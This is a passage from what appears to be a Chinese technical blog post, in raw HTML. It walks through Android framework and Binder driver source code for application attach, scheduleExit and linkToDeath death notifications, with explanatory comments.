didSomething |= mServices.attachApplicationLocked(app, processName);<br>            &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> e) &#123;<br>                badApp = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 检测这个进程是否有下一个Broadcast receiver</span><br>        <span class="hljs-keyword">if</span> (!badApp &amp;&amp; isPendingBroadcastProcessLocked(pid)) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                didSomething |= sendPendingBroadcastsLocked(app);<br>            &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> e) &#123;<br>                <span class="hljs-comment">// 如果app因为尝试启动Broadcast receiver而死亡，就设置badApp = true</span><br>                badApp = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//检查下一个backup代理是否在此过程中</span><br>        <span class="hljs-keyword">if</span> (!badApp &amp;&amp; mBackupTarget != <span class="hljs-literal">null</span> &amp;&amp; mBackupTarget.appInfo.uid == app.uid) &#123;<br>            notifyPackageUse(mBackupTarget.appInfo.packageName,<br>                             PackageManager.NOTIFY_PACKAGE_USE_BACKUP);<br>            <span class="hljs-keyword">try</span> &#123;<br>                thread.scheduleCreateBackupAgent(mBackupTarget.appInfo,<br>                        compatibilityInfoForPackageLocked(mBackupTarget.appInfo),<br>                        mBackupTarget.backupMode);<br>            &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> e) &#123;<br>                badApp = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br><br><span class="hljs-comment">//如果以上组件启动出错，则需要杀死进程并移除记录</span><br>        <span class="hljs-keyword">if</span> (badApp) &#123;<br>            app.kill(<span class="hljs-string">&quot;error during init&quot;</span>, <span class="hljs-literal">true</span>);<br>            handleAppDiedLocked(app, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br><span class="hljs-comment">//如果没有启动任何组件，那么didSomething为false</span><br><span class="hljs-comment">//调整进程的oom_adj值， oom_adj相当于一种优先级</span><br>        <span class="hljs-comment">//当内存出现不足时，该进程是最先被系统“杀死”</span><br>        <span class="hljs-keyword">if</span> (!didSomething) &#123;<br>            updateOomAdjLocked();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ol><li>通过pid查找当前进程对应的ProcessRecord</li><li>如果ProcessRecord == null，说明正在attach的进程不存在，如果pid有效就杀掉pid对应的进程；反之让刚创建的activitythread退出looper循环；最后直接return</li><li>如果查找出来的ProcessRecord 中保存的IApplicationThread不为空，说明它是上个进程的，那就需要清除它</li><li>注册该进程的死亡回调，当进程死亡时会通过binder回调,来通知system_server进程死亡的消息</li><li>重新设置ProcessRecord信息</li><li>调用thread.bindApplication绑定Application到ActivityThread</li><li>处理activity，service，Broadcast receiver</li><li>kill掉bad应用</li></ol><p>我们先看第二步，退出looper循环</p><p>thread.scheduleExit()</p><p>这里的thread是入参IApplicationThread，由上面分析可知，传过来的是APT在客户端的代理ATP，那就走到ATP.scheduleExit</p><h4 id="4-4-8-ATP-scheduleExit"><a href="#4-4-8-ATP-scheduleExit" class="headerlink" title="4.4.8 ATP.scheduleExit()"></a>4.4.8 ATP.scheduleExit()</h4><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">public</span> final void scheduleExit() throws <span class="hljs-type">RemoteException</span> &#123;<br>        <span class="hljs-type">Parcel</span> <span class="hljs-class"><span class="hljs-keyword">data</span> = <span class="hljs-type">Parcel</span>.obtain();</span><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.writeInterfaceToken(<span class="hljs-type">IApplicationThread</span>.<span class="hljs-title">descriptor</span>);</span><br>        mRemote.transact(<span class="hljs-type">SCHEDULE_EXIT_TRANSACTION</span>, <span class="hljs-class"><span class="hljs-keyword">data</span>, null,</span><br>                <span class="hljs-type">IBinder</span>.<span class="hljs-type">FLAG_ONEWAY</span>);<br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.recycle();</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>因为是代理对象，所以这里的mRemote是BinderProxy类型，调用后经过底层Binder调用会走到服务端的ATN.onTransact<br>（跟上面的AT调用AMS是一样的流程）</p><h4 id="4-4-9-ATN-onTransact"><a href="#4-4-9-ATN-onTransact" class="headerlink" title="4.4.9 ATN.onTransact()"></a>4.4.9 ATN.onTransact()</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public boolean on<span class="hljs-constructor">Transact(<span class="hljs-params">int</span> <span class="hljs-params">code</span>, Parcel <span class="hljs-params">data</span>, Parcel <span class="hljs-params">reply</span>, <span class="hljs-params">int</span> <span class="hljs-params">flags</span>)</span><br>            throws RemoteException &#123;<br>        switch (code) &#123;<br>case SCHEDULE_EXIT_TRANSACTION:<br>        &#123;<br>            data.enforce<span class="hljs-constructor">Interface(IApplicationThread.<span class="hljs-params">descriptor</span>)</span>;<br>            schedule<span class="hljs-constructor">Exit()</span>;<br>            return <span class="hljs-literal">true</span>;<br>        &#125;<br>        &#125;<br><br>        return super.on<span class="hljs-constructor">Transact(<span class="hljs-params">code</span>, <span class="hljs-params">data</span>, <span class="hljs-params">reply</span>, <span class="hljs-params">flags</span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>scheduleExit()具体实现在APT</p><h4 id="4-4-10-APT-scheduleExit"><a href="#4-4-10-APT-scheduleExit" class="headerlink" title="4.4.10 APT.scheduleExit()"></a>4.4.10 APT.scheduleExit()</h4><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">scheduleExit</span><span class="hljs-params">()</span> </span>&#123;<br>        sendMessage(H.EXIT_APPLICATION, <span class="hljs-keyword">null</span>);<br> &#125;<br></code></pre></td></tr></table></figure><p>继续调用到AT</p><h4 id="4-4-11-AT-sendMessage"><a href="#4-4-11-AT-sendMessage" class="headerlink" title="4.4.11 AT.sendMessage()"></a>4.4.11 AT.sendMessage()</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> void send<span class="hljs-constructor">Message(<span class="hljs-params">int</span> <span class="hljs-params">what</span>, Object <span class="hljs-params">obj</span>)</span> &#123;<br>        send<span class="hljs-constructor">Message(<span class="hljs-params">what</span>, <span class="hljs-params">obj</span>, 0, 0, <span class="hljs-params">false</span>)</span>;<br>    &#125;<br>    <span class="hljs-keyword">private</span> void send<span class="hljs-constructor">Message(<span class="hljs-params">int</span> <span class="hljs-params">what</span>, Object <span class="hljs-params">obj</span>, <span class="hljs-params">int</span> <span class="hljs-params">arg1</span>, <span class="hljs-params">int</span> <span class="hljs-params">arg2</span>, <span class="hljs-params">boolean</span> <span class="hljs-params">async</span>)</span> &#123;<br>        <span class="hljs-keyword">if</span> (DEBUG_MESSAGES) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Slog</span>.</span></span>v(<br>            TAG, <span class="hljs-string">&quot;SCHEDULE &quot;</span> + what + <span class="hljs-string">&quot; &quot;</span> + mH.code<span class="hljs-constructor">ToString(<span class="hljs-params">what</span>)</span><br>            + <span class="hljs-string">&quot;: &quot;</span> + arg1 + <span class="hljs-string">&quot; / &quot;</span> + obj);<br>        Message msg = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Message</span>.</span></span>obtain<span class="hljs-literal">()</span>;<br>        msg.what = what;<br>        msg.obj = obj;<br>        msg.arg1 = arg1;<br>        msg.arg2 = arg2;<br>        <span class="hljs-keyword">if</span> (async) &#123;<br>            msg.set<span class="hljs-constructor">Asynchronous(<span class="hljs-params">true</span>)</span>;<br>        &#125;<br>        mH.send<span class="hljs-constructor">Message(<span class="hljs-params">msg</span>)</span>;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> H extends Handler &#123;<br><br>public void handle<span class="hljs-constructor">Message(Message <span class="hljs-params">msg</span>)</span> &#123;<br><br>            switch (msg.what) &#123;<br>            case EXIT_APPLICATION:<br>                    <span class="hljs-keyword">if</span> (mInitialApplication != null) &#123;<br>                        mInitialApplication.on<span class="hljs-constructor">Terminate()</span>;<br>                    &#125;<br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Looper</span>.</span></span>my<span class="hljs-constructor">Looper()</span>.quit<span class="hljs-literal">()</span>;<br>                    break;<br>            <br>            &#125;<br>      &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>最终会将主线程的消息队列清空并退出looper；这一系列调用就是一个AIDL的实现</p><p>再看第四步，注册APP进程的死亡通知</p><p>thread.asBinder().linkToDeath</p><p>上面说了thread是代理对象，调用的是ATP.asBinder()，通过adBinder获取到的Binder类型是BinderProxy</p><h4 id="4-4-12-BinderProxy-linkToDeath"><a href="#4-4-12-BinderProxy-linkToDeath" class="headerlink" title="4.4.12 BinderProxy.linkToDeath()"></a>4.4.12 BinderProxy.linkToDeath()</h4><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">linkToDeath</span><span class="hljs-params">(DeathRecipient recipient, <span class="hljs-keyword">int</span> flags)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> RemoteException</span>;<br></code></pre></td></tr></table></figure><p>这是一个native方法，经过jni调用后</p><h4 id="4-4-13-android-util-Binder-linkToDeath"><a href="#4-4-13-android-util-Binder-linkToDeath" class="headerlink" title="4.4.13 android_util_Binder.linkToDeath()"></a>4.4.13 android_util_Binder.linkToDeath()</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> JNINativeMethod gBinderProxyMethods[] = &#123;<br>     &#123;<span class="hljs-string">&quot;linkToDeath&quot;</span>, <span class="hljs-string">&quot;(Landroid/os/IBinder$DeathRecipient;I)V&quot;</span>, (<span class="hljs-keyword">void</span>*)android_os_BinderProxy_linkToDeath&#125;<br> &#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">android_os_BinderProxy_linkToDeath</span><span class="hljs-params">(JNIEnv* env, jobject obj,</span></span><br><span class="hljs-params"><span class="hljs-function">        jobject recipient, jint flags)</span> <span class="hljs-comment">// throws RemoteException</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (recipient == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-comment">//jni抛异常</span><br>        <span class="hljs-built_in">jniThrowNullPointerException</span>(env, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br><span class="hljs-comment">//获取BpBinder</span><br>    BinderProxyNativeData *nd = <span class="hljs-built_in">getBPNativeData</span>(env, obj);<br>    IBinder* target = nd-&gt;mObject.<span class="hljs-built_in">get</span>();<br><br>    <span class="hljs-built_in">LOGDEATH</span>(<span class="hljs-string">&quot;linkToDeath: binder=%p recipient=%p\n&quot;</span>, target, recipient);<br><br>    <span class="hljs-keyword">if</span> (!target-&gt;<span class="hljs-built_in">localBinder</span>()) &#123;<br>        DeathRecipientList* list = nd-&gt;mOrgue.<span class="hljs-built_in">get</span>();<br>        sp&lt;JavaDeathRecipient&gt; jdr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">JavaDeathRecipient</span>(env, recipient, list);<br>        <span class="hljs-comment">//在这里建立死亡回调</span><br>        <span class="hljs-keyword">status_t</span> err = target-&gt;<span class="hljs-built_in">linkToDeath</span>(jdr, <span class="hljs-literal">NULL</span>, flags);<br>        <span class="hljs-keyword">if</span> (err != NO_ERROR) &#123;<br>            <span class="hljs-comment">// 添加到death recipient失败, 那清除引用</span><br>            jdr-&gt;<span class="hljs-built_in">clearReference</span>();<br>            <span class="hljs-built_in">signalExceptionForError</span>(env, obj, err, <span class="hljs-literal">true</span> <span class="hljs-comment">/*canThrowRemoteException*/</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">status_t</span> <span class="hljs-title">BpBinder::linkToDeath</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    <span class="hljs-keyword">const</span> sp&lt;DeathRecipient&gt;&amp; recipient, <span class="hljs-keyword">void</span>* cookie, <span class="hljs-keyword">uint32_t</span> flags)</span></span><br><span class="hljs-function"></span>&#123;<br>    Obituary ob;<br>    ob.recipient = recipient; <span class="hljs-comment">//该对象为JavaDeathRecipient</span><br>    ob.cookie = cookie; <span class="hljs-comment">// cookie=NULL</span><br>    ob.flags = flags; <span class="hljs-comment">// flags=0</span><br>    &#123;<br>        AutoMutex _l(mLock);<br>        <span class="hljs-keyword">if</span> (!mObitsSent) &#123; <span class="hljs-comment">//没有执行过sendObituary，则进入该方法</span><br>            <span class="hljs-keyword">if</span> (!mObituaries) &#123;<br>                mObituaries = <span class="hljs-keyword">new</span> Vector&lt;Obituary&gt;;<br>                <span class="hljs-keyword">if</span> (!mObituaries) &#123;<br>                    <span class="hljs-keyword">return</span> NO_MEMORY;<br>                &#125;<br>                <span class="hljs-built_in">getWeakRefs</span>()-&gt;<span class="hljs-built_in">incWeak</span>(<span class="hljs-keyword">this</span>);<br>                IPCThreadState* self = IPCThreadState::<span class="hljs-built_in">self</span>();<br>                <span class="hljs-comment">//向Binder驱动写命令</span><br>                self-&gt;<span class="hljs-built_in">requestDeathNotification</span>(mHandle, <span class="hljs-keyword">this</span>);<br>                <span class="hljs-comment">//给驱动发消息</span><br>                self-&gt;<span class="hljs-built_in">flushCommands</span>();<br>            &#125;<br>            <span class="hljs-comment">//将新创建的Obituary添加到mObituaries</span><br>            <span class="hljs-keyword">ssize_t</span> res = mObituaries-&gt;<span class="hljs-built_in">add</span>(ob);<br>            <span class="hljs-keyword">return</span> res &gt;= (<span class="hljs-keyword">ssize_t</span>)NO_ERROR ? (<span class="hljs-keyword">status_t</span>)NO_ERROR : res;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> DEAD_OBJECT;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">status_t</span> <span class="hljs-title">IPCThreadState::requestDeathNotification</span><span class="hljs-params">(<span class="hljs-keyword">int32_t</span> handle, BpBinder* proxy)</span></span><br><span class="hljs-function"></span>&#123;<br>    mOut.<span class="hljs-built_in">writeInt32</span>(BC_REQUEST_DEATH_NOTIFICATION);<br>    mOut.<span class="hljs-built_in">writeInt32</span>((<span class="hljs-keyword">int32_t</span>)handle);<br>    mOut.<span class="hljs-built_in">writePointer</span>((<span class="hljs-keyword">uintptr_t</span>)proxy);<br>    <span class="hljs-keyword">return</span> NO_ERROR;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">IPCThreadState::flushCommands</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (mProcess-&gt;mDriverFD &lt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-built_in">talkWithDriver</span>(<span class="hljs-literal">false</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里最终会调用talkWithDriver告诉Binder驱动</p><h4 id="4-4-14-IPCThreadState-talkWithDriver"><a href="#4-4-14-IPCThreadState-talkWithDriver" class="headerlink" title="4.4.14 IPCThreadState::talkWithDriver()"></a>4.4.14 IPCThreadState::talkWithDriver()</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">status_t</span> <span class="hljs-title">IPCThreadState::talkWithDriver</span><span class="hljs-params">(<span class="hljs-keyword">bool</span> doReceive)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (mProcess-&gt;mDriverFD &lt;= <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> -EBADF;<br>    &#125;<br><br>    binder_write_read bwr;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">bool</span> needRead = mIn.<span class="hljs-built_in">dataPosition</span>() &gt;= mIn.<span class="hljs-built_in">dataSize</span>();<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">size_t</span> outAvail = (!doReceive || needRead) ? mOut.<span class="hljs-built_in">dataSize</span>() : <span class="hljs-number">0</span>;<br><br>    bwr.write_size = outAvail;<br>    bwr.write_buffer = (<span class="hljs-keyword">uintptr_t</span>)mOut.<span class="hljs-built_in">data</span>();<br><br>    <span class="hljs-comment">// This is what we&#x27;ll read.</span><br>    <span class="hljs-keyword">if</span> (doReceive &amp;&amp; needRead) &#123;<br>        bwr.read_size = mIn.<span class="hljs-built_in">dataCapacity</span>();<br>        bwr.read_buffer = (<span class="hljs-keyword">uintptr_t</span>)mIn.<span class="hljs-built_in">data</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        bwr.read_size = <span class="hljs-number">0</span>;<br>        bwr.read_buffer = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    bwr.write_consumed = <span class="hljs-number">0</span>;<br>    bwr.read_consumed = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">status_t</span> err;<br>    <span class="hljs-keyword">do</span> &#123;<br><br><span class="hljs-comment">//将命令发送给Binder驱动</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(mProcess-&gt;mDriverFD, BINDER_WRITE_READ, &amp;bwr) &gt;= <span class="hljs-number">0</span>)<br>            err = NO_ERROR;<br>        <span class="hljs-keyword">else</span><br>            err = -errno;<br><br>        err = INVALID_OPERATION;<br><br>        <span class="hljs-keyword">if</span> (mProcess-&gt;mDriverFD &lt;= <span class="hljs-number">0</span>) &#123;<br>            err = -EBADF;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (err == -EINTR);<br><br>......<br>    <span class="hljs-keyword">return</span> err;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">binder_ioctl</span><span class="hljs-params">(struct file *filp, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> cmd, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> ret;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">binder_proc</span> *<span class="hljs-title">proc</span> =</span> filp-&gt;private_data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">binder_thread</span> *<span class="hljs-title">thread</span>;</span><br>    ret = <span class="hljs-built_in">wait_event_interruptible</span>(binder_user_error_wait, binder_stop_on_user_error &lt; <span class="hljs-number">2</span>);<br>    ...<br><br>    <span class="hljs-built_in">binder_lock</span>(__func__);<br>    thread = <span class="hljs-built_in">binder_get_thread</span>(proc); <span class="hljs-comment">//获取binder_thread</span><br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (cmd) &#123;<br>      <span class="hljs-keyword">case</span> BINDER_WRITE_READ:  <span class="hljs-comment">//进行binder的读写操作</span><br>          ret = <span class="hljs-built_in">binder_ioctl_write_read</span>(filp, cmd, arg, thread); <br>          <span class="hljs-keyword">if</span> (ret)<br>              <span class="hljs-keyword">goto</span> err;<br>          <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> ...<br>    &#125;<br>    ret = <span class="hljs-number">0</span>;<br><br>err:<br>    <span class="hljs-keyword">if</span> (thread)<br>        thread-&gt;looper &amp;= ~BINDER_LOOPER_STATE_NEED_RETURN;<br>    <span class="hljs-built_in">binder_unlock</span>(__func__);<br>     ...<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">binder_ioctl_write_read</span><span class="hljs-params">(struct file *filp,</span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> cmd, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg,</span></span><br><span class="hljs-params"><span class="hljs-function">                struct binder_thread *thread)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">binder_proc</span> *<span class="hljs-title">proc</span> =</span> filp-&gt;private_data;<br>    <span class="hljs-keyword">void</span> __user *ubuf = (<span class="hljs-keyword">void</span> __user *)arg;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">binder_write_read</span> <span class="hljs-title">bwr</span>;</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">copy_from_user</span>(&amp;bwr, ubuf, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(bwr))) &#123; <span class="hljs-comment">//把用户空间数据ubuf拷贝到bwr</span><br>        ret = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (bwr.write_size &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//此时写缓存有数据</span><br>        ret = <span class="hljs-built_in">binder_thread_write</span>(proc, thread,<br>                  bwr.write_buffer, bwr.write_size, &amp;bwr.write_consumed);<br>        ...<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (bwr.read_size &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//此时读缓存无数据</span><br>        ...<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">copy_to_user</span>(ubuf, &amp;bwr, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(bwr))) &#123; <span class="hljs-comment">//将内核数据bwr拷贝到用户空间ubuf</span><br>        ret = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br>out:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">//处理进程发送给Binder驱动的请求</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">binder_thread_write</span><span class="hljs-params">(struct binder_proc *proc, struct binder_thread *thread, <span class="hljs-keyword">binder_uintptr_t</span> binder_buffer, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">binder_size_t</span> *consumed)</span> </span>&#123;<br>  <span class="hljs-keyword">uint32_t</span> cmd;<br>  <span class="hljs-keyword">void</span> __user *buffer = (<span class="hljs-keyword">void</span> __user *)(<span class="hljs-keyword">uintptr_t</span>)binder_buffer;<br>  <span class="hljs-keyword">void</span> __user *ptr = buffer + *consumed;<br>  <span class="hljs-keyword">void</span> __user *end = buffer + size;<br><br>  <span class="hljs-keyword">while</span> (ptr &lt; end &amp;&amp; thread-&gt;return_error == BR_OK) &#123;<br>    <span class="hljs-built_in">get_user</span>(cmd, (<span class="hljs-keyword">uint32_t</span> __user *)ptr); <span class="hljs-comment">//获取命令</span><br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (cmd) &#123;<br>      <span class="hljs-keyword">case</span> BC_REQUEST_DEATH_NOTIFICATION:<br>          <span class="hljs-comment">//添加到当前线程的todo队列</span><br>          <span class="hljs-built_in">list_add_tail</span>(&amp;ref-&gt;death-&gt;work.entry, &amp;thread-&gt;todo);<br>          <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> ...;<br>    &#125;<br>  &#125;    